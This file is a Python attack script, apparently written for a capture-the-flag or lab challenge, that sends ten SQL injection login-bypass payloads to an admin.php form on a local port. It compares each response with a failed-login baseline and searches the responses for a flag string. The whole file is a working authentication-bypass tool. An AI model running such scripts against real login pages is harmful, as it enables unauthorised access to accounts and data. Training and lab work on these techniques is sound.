import requests
import re

# Target configuration
target_url = "http://127.0.0.1:32816/admin.php"
session_cookie = {"PHPSESSID": "40bd21fd631cfebd5f684d8a97f3d915"}

# SQL injection payloads
payloads = [
    "admin' OR '1'='1",
    "admin'--",
    "admin' #",
    "' OR 1=1--",
    "admin' OR 1=1--",
    "' OR '1'='1'--",
    "admin' OR '1'='1'--",
    "') OR ('1'='1",
    "admin') OR ('1'='1')--",
    "' OR 'a'='a"
]

print("[*] Starting SQL Injection Testing on admin.php")
print(f"[*] Target: {target_url}")
print(f"[*] Testing {len(payloads)} payloads\n")

# First, establish baseline with normal failed login
print("[*] Establishing baseline with normal failed login...")
baseline_data = {"username": "normaluser", "password": "wrongpassword"}
baseline_response = requests.post(target_url, data=baseline_data, cookies=session_cookie, allow_redirects=False)
baseline_status = baseline_response.status_code
baseline_length = len(baseline_response.content)
baseline_location = baseline_response.headers.get('Location', 'None')

print(f"[+] Baseline Status: {baseline_status}")
print(f"[+] Baseline Length: {baseline_length}B")
print(f"[+] Baseline Location: {baseline_location}")
print(f"[+] Baseline Response Preview: {baseline_response.text[:200]}")
print()

# Test each payload
results = []
for i, payload in enumerate(payloads, 1):
    print(f"[{i}/{len(payloads)}] Testing payload: {payload}")
    
    # Prepare request data
    data = {
        "username": payload,
        "password": "password"
    }
    
    try:
        # Send POST request
        response = requests.post(target_url, data=data, cookies=session_cookie, allow_redirects=False)
        
        status_code = response.status_code
        content_length = len(response.content)
        location_header = response.headers.get('Location', 'None')
        
        # Check for differences from baseline
        status_diff = status_code != baseline_status
        length_diff = abs(content_length - baseline_length) > 50  # Significant difference
        location_diff = location_header != baseline_location
        
        # Look for success indicators
        success_indicators = [
            'welcome',
            'dashboard',
            'logged in',
            'logout',
            'admin panel',
            'FLAG{',
            'success'
        ]
        
        response_text_lower = response.text.lower()
        found_indicators = [ind for ind in success_indicators if ind in response_text_lower]
        
        # Check for SQL error messages
        sql_errors = [
            'sql syntax',
            'mysql',
            'mysqli',
            'syntax error',
            'database error',
            'query failed'
        ]
        found_errors = [err for err in sql_errors if err in response_text_lower]
        
        # Determine if this is interesting
        is_interesting = (status_diff or length_diff or location_diff or 
                         found_indicators or found_errors)
        
        result = {
            'payload': payload,
            'status': status_code,
            'length': content_length,
            'location': location_header,
            'interesting': is_interesting,
            'indicators': found_indicators,
            'errors': found_errors,
            'response': response.text
        }
        results.append(result)
        
        # Print result
        print(f"    Status: {status_code} | Length: {content_length}B | Location: {location_header}")
        
        if is_interesting:
            print(f"    [!] INTERESTING RESPONSE DETECTED!")
            if found_indicators:
                print(f"    [!] Success indicators found: {found_indicators}")
            if found_errors:
                print(f"    [!] SQL errors found: {found_errors}")
            if status_diff:
                print(f"    [!] Status code differs from baseline ({baseline_status} -> {status_code})")
            if length_diff:
                print(f"    [!] Content length significantly different ({baseline_length}B -> {content_length}B)")
            if location_diff:
                print(f"    [!] Redirect location differs: {location_header}")
        
        print()
        
    except Exception as e:
        print(f"    [ERROR] Request failed: {str(e)}")
        print()
        results.append({
            'payload': payload,
            'error': str(e)
        })

# Summary
print("\n" + "="*80)
print("SUMMARY OF RESULTS")
print("="*80)

interesting_results = [r for r in results if r.get('interesting', False)]

if interesting_results:
    print(f"\n[!] Found {len(interesting_results)} interesting responses:\n")
    for result in interesting_results:
        print(f"Payload: {result['payload']}")
        print(f"  Status: {result['status']} | Length: {result['length']}B | Location: {result['location']}")
        if result['indicators']:
            print(f"  Success Indicators: {result['indicators']}")
        if result['errors']:
            print(f"  SQL Errors: {result['errors']}")
        
        # Search for FLAG pattern in response
        flag_match = re.search(r'FLAG\{[^}]+\}', result['response'])
        if flag_match:
            print(f"  [!!!] FLAG FOUND: {flag_match.group(0)}")
        
        print(f"  Response Preview:\n{result['response'][:500]}")
        print()
else:
    print("\n[*] No interesting responses detected. All payloads produced similar results to baseline.")

# Print full response for most interesting result
if interesting_results:
    print("\n" + "="*80)
    print("FULL RESPONSE FOR MOST INTERESTING PAYLOAD")
    print("="*80)
    most_interesting = interesting_results[0]
    print(f"\nPayload: {most_interesting['payload']}")
    print(f"Status: {most_interesting['status']}")
    print(f"Location: {most_interesting['location']}")
    print(f"\nFull Response:\n")
    print(most_interesting['response'])

